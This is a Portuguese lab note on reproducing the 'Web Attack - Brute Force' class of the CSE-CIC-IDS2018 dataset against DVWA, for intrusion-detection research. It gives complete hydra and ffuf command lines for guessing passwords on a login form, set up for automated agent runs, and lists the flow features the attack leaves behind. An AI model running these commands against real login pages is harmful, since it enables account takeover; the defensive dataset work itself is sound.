# Web Attack - Brute Force

- **Classe no CSE-CIC-IDS2018:** `Web Attack - Brute Force`
- **Volume no Dataset Corrigido:** 131 fluxos (classe minoritária estrita mantida 100% na amostragem)
- **Camada OSI:** Camada 7 (Aplicação - Formulários HTTP POST/GET)
- **Alvo no Laboratório:** Módulo de Login / Brute Force do DVWA ([[Ambiente de Ataques]]) na porta 8080
- **Status de Reprodução:** Reproduzível no laboratório

---

## 1. Ferramenta no Kali Linux

- **Ferramenta Principal no Kali:** `hydra` (módulo `http-form-post` ou `http-get-form`)
- **Alternativas Especializadas em Web:** `ffuf`, `wfuzz`, `burpsuite` (módulo Intruder), `patator`
- **Verificação no Kali:**
  ```bash
  which hydra ffuf wfuzz
  ```

---

## 2. Como a Ferramenta Realiza o Ataque

O **Web Attack - Brute Force** consiste no envio sistemático e automatizado de credenciais contra formulários de autenticação web:

1. **Análise do Formulário Alvo:**
   O atacante inspeciona a requisição HTTP enviada pela aplicação web (ex.: formulário de login do DVWA em `http://[ALVO]:8080/vulnerabilities/brute/`). Identifica o método HTTP (`GET` ou `POST`), os nomes dos parâmetros (`username`, `password`, `Login`, token CSRF se houver) e a resposta retornada quando a senha está incorreta (ex.: string `"Username and/or password incorrect."`).
2. **Submissão Automatizada de Requisições:**
   A ferramenta abre múltiplas conexões HTTP concorrentes e substitui dinamicamente os valores de usuário e senha por entradas de uma wordlist.
3. **Validação de Sucesso e Parada:**
   Ao receber a resposta HTTP do servidor (código de status ou ausência da mensagem de erro configurada), a ferramenta identifica quando a autenticação foi bem-sucedida e interrompe ou relata as credenciais válidas encontradas.

---

## 3. Modo de Execução no Testbed (Kali $\rightarrow$ DVWA)

```bash
# 1. Execução com Hydra (módulo http-get-form conforme documentação do kali-tools)
hydra -l admin -P [WORDLIST] [IP_VITIMA]:8080 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=[SESSION_ID]; security=low:F=Username and/or password incorrect." -t 4 -f -v

# 2. Alternativa com ffuf (modo não interativo para agentes)
ffuf -u "http://[IP_VITIMA]:8080/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login" \
     -w [WORDLIST] \
     -H "Cookie: PHPSESSID=[SESSION_ID]; security=low" \
     -fr "Username and/or password incorrect." \
     -t 4 -noninteractive -s
```

- `-l admin`: Usuário alvo padrão do DVWA.
- `-P [WORDLIST]`: Dicionário com senhas candidatas.
- `http-get-form`: Módulo de formulário web via GET utilizado pelo DVWA (delimitado por `:` com rota, parâmetros `^USER^`/`^PASS^`, cabeçalho `H=` e condição de falha `F=`).
- `-t 4`: Concorrência restrita a 4 threads para evitar bloqueios ou colapso do Apache.
- `-f`: Encerra o processo ao encontrar a primeira senha válida.
- `-noninteractive` (no `ffuf`): Execução silenciosa e determinística, ideal para automação via LLM agents.

> [!NOTE]
> No framework de testes automatizados ([[AGENTS]]), este vetor é atribuído ao especialista `WebAuthAuditor`.


---

## 4. Assinatura e Impacto nas Features do NIDS (ALF-MoE)

No nível de fluxo do NIDS:

| Feature de Fluxo | Comportamento Observado | Justificativa Operacional |
| :--- | :---: | :--- |
| `Flow Duration` | **Curta a Média** | Requisições HTTP pontuais de envio de formulário e resposta imediata. |
| `Fwd Packet Length Mean` | **Uniforme** | Requisições com tamanho de payload praticamente idêntico (pequenas variações no comprimento da senha). |
| `Bwd Packet Length Std` | **Muito Baixo** | Respostas de erro retornadas pela aplicação possuem quase o mesmo tamanho em bytes. |
| `Flow Packets/s` | **Moderado** | Limitado pela capacidade de processamento do backend PHP/Apache. |
| `PSH Flag Count` | **Constante** | Presente em todas as trocas de dados HTTP. |

---

## 5. Relação com outras Notas

- [[00 - Mapeamento de Ataques Kali Linux]]
- [[Ambiente de Ataques]]
- [[SSH - Brute Force]]
- [[Web Attack - XSS]]
- [[Web Attack - SQL Injection]]
